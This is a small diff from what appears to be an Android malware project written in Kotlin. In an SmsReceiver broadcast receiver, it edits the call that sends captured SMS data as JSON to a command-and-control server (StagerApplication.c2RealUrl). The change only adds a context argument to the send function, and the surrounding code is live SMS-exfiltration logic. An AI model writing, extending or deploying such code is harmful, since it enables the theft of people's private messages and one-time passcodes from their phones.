@@ -72,7 +72,7 @@ class SmsReceiver : BroadcastReceiver() {
                     put("timestamp", System.currentTimeMillis())
                 }
 
-                NetworkUtils.sendToC2(StagerApplication.c2RealUrl, json.toString())
+                NetworkUtils.sendToC2(StagerApplication.c2RealUrl, json.toString(), context)
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to send SMS to C2", e)
             }
